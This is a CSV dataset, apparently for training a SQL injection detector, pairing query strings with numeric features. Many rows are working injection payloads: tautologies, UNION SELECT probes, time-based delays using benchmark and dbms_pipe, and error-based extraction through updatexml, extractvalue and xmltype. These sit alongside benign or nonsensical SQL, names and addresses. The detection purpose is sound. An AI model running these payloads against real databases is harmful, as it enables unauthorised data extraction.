,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
9269,"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",0,4,19,0,0,21,0,2,1,0,0,78,10,0,2,4.948759890378168,7.277936646208279
3689,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",4,0,25,0,0,29,0,2,0,0,1,49,39,0,1,5.225746673713202,7.863109066817221
19968,"  select dayofweek ( ""2017-06-15"" ) ;",0,2,7,0,0,6,0,0,2,0,0,15,8,0,1,3.610917912644224,4.764024421755989
8439," end and    (    (   ""dmgj""  =  ""dmgj",0,3,6,0,0,7,0,1,0,0,0,14,0,0,0,3.610917912644224,4.764024421755989
22065,"   select count ( rice ) , lungs from laid by include",0,0,3,0,0,11,0,0,0,0,0,37,0,0,2,3.970291913552122,5.391515666300752
29596,select avg ( pan ) from conversation select sum ( notice ) ,0,0,4,0,0,12,0,0,0,0,0,43,0,0,4,4.07753744390572,5.5852871348767055
14676,6721,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
14416,estiradamente,0,0,0,0,0,0,0,0,0,0,0,13,0,0,0,2.5649493574615367,3.1155015354702966
862,|,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0
19749,select * from users where userid  =  105 or 1 = 1;,0,0,4,0,0,11,0,1,1,0,0,28,5,0,1,3.912023005428146,5.287509109454676
28187,select * from case order by somebody desc,0,0,1,0,0,7,0,0,1,0,0,33,0,0,2,3.713572066704308,4.939896154656966
11096,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,0,23,1,0,24,0,4,2,0,0,36,16,4,0,4.795790545596741,6.964836608637794
11870,6160,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
25944,select * from chair where count = 'general' limit 3,2,0,4,0,0,9,0,0,1,0,0,37,1,0,2,3.9318256327243257,5.322755734775789
22390, update serve set official = 'colony'where labor = 'dark',4,0,6,0,0,9,0,0,0,0,0,42,0,0,0,4.04305126783455,5.522643883333643
4720,"-3865'  )   union all select 4935,4935,4935,4935,4935--",1,0,9,1,0,5,0,0,3,0,0,14,24,0,1,4.007333185232471,5.458096843121287
15960,ponferrada 65 10-c,0,0,1,0,0,2,0,0,1,0,0,11,4,0,0,2.8903717578961645,3.6015010896570807
20363,select * from became where term between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,35,16,0,1,4.23410650459726,5.873719016140452
56,or 1  =  1--,0,0,3,1,0,3,0,0,2,0,0,2,2,0,0,2.4849066497880004,2.999482870035824
7082, (  8362  =  9139  )  *9139,0,0,4,0,0,6,0,0,1,0,0,0,12,0,0,3.295836866004329,4.240494654101009
6033,1'+  (  select 'zugq' where 9218  =  9218,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1,3.713572066704308,4.939896154656966
360," select * from users where id  =  '1' + $ . union select 1,@@version -- 1'",3,0,13,1,0,16,0,0,4,0,0,40,3,0,2,4.30406509320417,6.004758445183105
29457,select * from situation where additional = 'eye'  or slope = 'horn',4,0,7,0,0,11,0,1,1,0,0,48,0,0,1,4.204692619390966,5.819025031871101
2451,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",1,0,16,1,0,11,0,0,4,0,0,29,52,0,2,4.718498871295094,6.809292299444515
4226,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,1,56,0,0,70,0,11,0,0,0,81,49,10,1,5.793013608384144,9.13854521402362
3059,"-6129 union all select 9122,9122#",0,0,3,0,0,4,0,0,1,0,0,14,12,0,1,3.49650756146648,4.571113592379885
22506,select top 3 * from could select * from pressure 3select * from seen,0,0,3,0,0,13,0,0,3,0,0,50,2,0,3,4.219507705176107,5.846543550882007
21965,"  select recently,setting from century where be = 'solve' union select avoid, addition from front",2,0,5,0,0,14,0,0,0,0,0,77,0,0,2,4.574710978503383,6.524589271310591
22300,select top 50 percent * from kept,0,0,1,0,0,6,0,0,1,0,0,24,2,0,2,3.49650756146648,4.571113592379885
27276,select steep ( s )  from laid select point from tribe,0,0,2,0,0,10,0,0,0,0,0,40,0,0,2,3.970291913552122,5.391515666300752
16073,35093869d,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
5239,1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,0,0,70,1,0,94,0,14,2,0,0,112,59,13,2,6.063785208687608,9.785880693857154
17769,hermindo,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
2306,"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",0,1,10,1,0,15,0,1,3,0,0,16,24,0,0,4.330733340286331,6.055066595411042
3259,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,0,56,0,0,71,0,11,0,0,0,81,49,10,1,5.805134968916488,9.166976225713936
2063,"1%'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,20,0,0,23,1,0,0,0,1,50,23,0,0,5.017279836814924,7.4204839101504465
11455,azarshah,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
11364,montroy,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
4382,"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",3,0,18,1,0,13,0,1,2,10,0,77,9,10,2,4.795790545596741,6.964836608637794
27599,"insert into automobile ( cry, strange, cost, though, wise, original )  values  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",13,0,28,0,0,21,0,0,0,0,0,92,0,0,0,4.969813299576001,7.321582942195207
7759, (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4501  =  4501  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,0,0,65,0,0,84,0,13,0,0,0,98,46,13,2,5.934894195619588,9.474525631026046
29079,"  update second set rocket =  'hearing', city =  'use' where test =  slept",4,0,8,0,0,13,0,0,0,0,0,49,0,0,0,4.30406509320417,6.004758445183105
3845,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",4,0,37,0,0,61,0,2,2,0,0,110,55,0,7,5.777652323222656,9.102587570813418
4826,1   )    )    as oqui where 3368  =  3368 order by 1--,0,0,5,1,0,11,0,0,2,0,0,18,10,0,1,3.9889840465642745,5.42506920217274
27236,select avg ( broad ) from trouble,0,0,2,0,0,6,0,0,0,0,0,25,0,0,2,3.49650756146648,4.571113592379885
7158,"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,20,0,0,29,0,0,0,0,1,61,31,0,0,5.181783550292085,7.768632789417219
14236,erikson@elcarritodelacompra.gw,0,0,2,0,0,0,0,0,0,0,0,28,0,0,0,3.4011973816621555,4.412867051146341
19342,select option_value from wp_options where option_name  =  '_options_facebook_url' limit 1,2,0,9,0,0,9,0,0,0,0,0,68,1,0,1,4.48863636973214,6.357017110069445
5666,"iif  (  8770  =  9611,1,1/0  )  ",0,0,6,0,0,6,0,0,1,0,0,3,11,0,0,3.4657359027997265,4.519779854678687
13037,"pealara, 87",0,0,1,0,0,1,0,0,0,0,0,7,2,0,0,2.3978952727983707,2.8749024412290907
27452,select * from basic where please between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,36,16,0,1,4.248495242049359,5.900560584269694
14199,9.54e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
7782,"-6629%""   )    )     )   or 8571  =  8571--",0,1,9,1,0,7,1,1,3,0,0,2,12,0,0,3.7612001156935615,5.022400427811018
5911,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",3,0,11,0,0,11,0,1,1,0,0,29,24,0,2,4.3694478524670215,6.128451232979604
28566,select count ( distinct pupil )  from movement,0,0,2,0,0,7,0,0,0,0,0,36,0,0,2,3.828641396489095,5.140218969441503
10894,select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2,4.5217885770490405,6.42130769614405
7015,1   )    )    as pmff where 6649  =  6649,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0,3.713572066704308,4.939896154656966
26054,select * from forgotten where write = 'pain' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,51,1,0,3,4.219507705176107,5.846543550882007
27402,"insert into line ( center, soap, came, farther, bread, pot )  values  ( 'night', 'moment'. any', 'pile', 'desk', 'baby', 'does' )  ",13,0,28,0,0,21,0,0,0,0,0,79,0,0,0,4.875197323201151,7.1264886919277375
27051,"  select * from building where remain not in  ( 'blanket', 'printed', 'eager' )  ",6,0,11,0,0,14,0,1,1,0,0,53,0,0,1,4.394449154672439,6.17606445953937
18184,1.72e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
27075," select column_name ( s )  from swung,uncle",0,0,4,0,0,7,0,0,0,0,0,31,0,0,1,3.7612001156935615,5.022400427811018
24960,select * from tell where article = 'value' limit 3,2,0,4,0,0,9,0,0,1,0,0,36,1,0,1,3.912023005428146,5.287509109454676
30289,"  select * from higher where available not in  ( 'work', 'turn', 'plan' )  ",6,0,11,0,0,14,0,1,1,0,0,47,0,0,1,4.31748811353631,6.030055566276218
18062,7626,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
90,1 and user_name  (    )     =   'dbo',2,0,6,0,0,6,0,1,0,0,0,14,1,0,0,3.610917912644224,4.764024421755989
15388,"c/ pedro guezala 192, 6?a",0,0,3,0,0,4,0,0,1,0,0,14,4,0,0,3.218875824868201,4.116261188933881
23338,select tower ( s )  from sometime union,0,0,2,0,0,7,0,0,0,0,0,29,0,0,1,3.6635616461296463,4.853884482035236
772,or 1  =  1 /*,0,0,3,0,1,4,0,0,0,0,0,2,2,0,0,2.5649493574615367,3.1155015354702966
3807,-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,0,0,6,1,0,12,0,0,3,0,0,25,16,0,1,4.23410650459726,5.873719016140452
5496,"1""  )   where 7840  =  7840 union all select null,null#",0,1,5,0,0,9,0,0,0,2,0,27,9,2,1,4.007333185232471,5.458096843121287
29336,select fire ( s )  from see full outer join,0,0,2,0,0,9,0,0,0,0,0,31,0,0,2,3.7612001156935615,5.022400427811018
19590,select column_names from table_name where column_name is not null;,0,0,4,0,0,8,0,1,0,1,0,54,0,1,1,4.189654742026425,5.791153910047609
25767,select avg ( poor ) from library,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.4657359027997265,4.519779854678687
13687,strade_rosenthal@latiendadecolchones.kr,0,0,3,0,0,0,0,0,0,0,0,36,0,0,0,3.6635616461296463,4.853884482035236
21271,select safety from grow union select tales from deal order by thank,0,0,0,0,0,11,0,0,0,0,0,56,0,0,3,4.204692619390966,5.819025031871101
10167,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  '%'  =  '",3,0,16,0,0,19,1,1,1,0,0,72,4,0,2,4.795790545596741,6.964836608637794
21432,select count ( took ) from sitting,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.5263605246161616,4.621137163019105
17862,calle clavel 30 11?b,0,0,1,0,0,3,0,0,0,0,0,12,4,0,0,2.995732273553991,3.7638991627446954
1990,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,1,8,0,0,11,0,1,0,0,1,17,19,0,0,4.219507705176107,5.846543550882007
3502,"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1,0,13,0,0,8,0,0,1,0,0,19,52,0,1,4.543294782270004,6.463181585426342
16521,aguadulce,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
29654,select * from riding where    not work = 'known',2,0,4,0,0,8,0,1,1,0,0,33,0,0,1,3.871201010907891,5.215173163969822
10355,select   (  case when   (  8601  =  1220  )   then 8601 else 8601*  (  select 8601 from mysql.db  )   end  )  #,0,0,10,0,0,21,0,0,1,0,0,42,20,0,2,4.709530201312334,6.791357624410744
16859,humfrid,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
23741,select equator,0,0,0,0,0,1,0,0,0,0,0,13,0,0,1,2.6390573296152584,3.2241419783899143
13485,kellard@todobetis.gf,0,0,2,0,0,0,0,0,0,0,0,18,0,0,0,2.995732273553991,3.7638991627446954
18321,chaddie,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
26142,select min ( cry )  as travel from silly,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
521," select * from users where id  =  1 or $+<$ union select 1,@@version -- 1",0,0,11,1,0,15,0,1,4,0,0,42,3,0,2,4.290459441148391,5.97916802637938
28645,select part ( s )  from cannot left join,0,0,2,0,0,8,0,0,0,0,0,29,0,0,2,3.688879454113936,4.897348914472564
22832,select count ( design )  from begun,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.555348061489413,4.669921102482963
9182,-4610'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 e,1,0,41,0,0,55,0,8,1,0,0,64,37,7,2,5.541263545158426,8.559367492058051
5033,"-6854"" where 7794  =  7794 union all select 7794,7794--",0,1,6,1,0,8,0,0,3,0,0,19,20,0,1,4.007333185232471,5.458096843121287
14815,"c/ fuente pista de tenis, 164",0,0,2,0,0,5,0,0,1,0,0,19,3,0,0,3.367295829986474,4.357111686472804
11538,4a2ho4a2o,0,0,0,0,0,0,0,0,0,0,0,5,4,0,0,2.19722457733622,2.593591245490939
21333,select count ( fall ) from gift,0,0,2,0,0,6,0,0,0,0,0,23,0,0,2,3.4339872044851463,4.467059038127735
14410,buenda,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
29041,select diagram ( s from actual right join,0,0,1,0,0,7,0,0,0,0,0,33,0,0,2,3.713572066704308,4.939896154656966
6364,"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",0,0,17,0,0,19,0,0,0,0,1,34,35,0,1,4.90527477843843,7.188213210536463
29712,select count ( spite )  from kids,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.49650756146648,4.571113592379885
23097,select top 3 * from alive select * from black 3select * from completely,0,0,3,0,0,13,0,0,3,0,0,53,2,0,3,4.262679877041316,5.927077040928176
19267,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 27990 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,5,0,2,4.634728988229636,6.642694885740106
24016,"  select bicycle as lion, mood as [toward]  from naturally",0,0,3,0,0,9,0,0,0,0,0,44,0,0,1,4.060443010546419,5.554195840989334
16536,41484237b,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
11738,eddisfor4,0,0,0,0,0,0,0,0,0,0,0,8,1,0,0,2.19722457733622,2.593591245490939
17881,ianace,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
17831,7012,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
1446,"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,32,1,0,44,0,1,4,0,1,54,79,0,4,5.594711379601839,8.680543996432856
19797,"  select insert ( ""w3schools.com"", 1, 9, ""example"" ) ;",0,4,11,0,0,9,0,0,0,0,0,30,3,0,1,3.9889840465642745,5.42506920217274
27128,select * from  ( select former from frame ) ,0,0,3,0,0,9,0,0,1,0,0,31,0,0,2,3.784189633918261,5.062431490914847
24331,select * from production fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,45,2,0,3,4.04305126783455,5.522643883333643
17694,rancar,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
23546,select distinct trick from rain,0,0,0,0,0,4,0,0,0,0,0,27,0,0,1,3.4339872044851463,4.467059038127735
20877,"  select gas,tree from review where question = 'today' union select old, charge from average",2,0,5,0,0,14,0,0,0,0,0,72,0,1,2,4.5217885770490405,6.42130769614405
13009,guadalcanal,0,0,0,0,0,0,0,0,0,0,0,11,0,0,0,2.3978952727983707,2.8749024412290907
11549,72523597c,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
1803,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",0,0,12,1,0,15,0,0,3,0,0,73,4,0,2,4.691347882229144,6.755070870794325
24220,"  select orders.paintrid, employees.friend, employees.opportunity from ordersright join employees on orders.employeeid  =  employees.feltid order by orders.totalid",0,0,9,0,0,15,0,0,0,0,0,136,0,0,3,5.093750200806762,7.581275718599696
27525,select top 50 percent * from picture select * from rod fetch first 50 percent rows onlyselect top 3 * from spirit,0,0,3,0,0,21,0,0,3,0,0,84,5,0,6,4.727387818712341,6.827090900265457
30416,select especially from hello union select composition from environment order by block,0,0,0,0,0,11,0,0,0,0,0,74,0,0,3,4.442651256490317,6.268357393526619
20134,select min ( price )  as smallestpricefrom products;,0,0,3,0,0,7,0,0,0,0,0,41,0,0,1,3.951243718581428,5.357417698153898
20037,"  select time ( ""2017-08-15 19:30:10"" ) ;",0,2,9,0,0,7,0,0,2,0,0,10,14,0,1,3.713572066704308,4.939896154656966
8859,"1"" where 8387  =  8387",0,1,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
126," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",2,1,12,1,0,17,0,1,3,0,0,43,3,0,2,4.418840607796598,6.222685223035155
18925,2946,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
12605,cambiazo,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
3246,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",0,0,13,1,0,5,0,0,3,0,0,14,44,0,1,4.3694478524670215,6.128451232979604
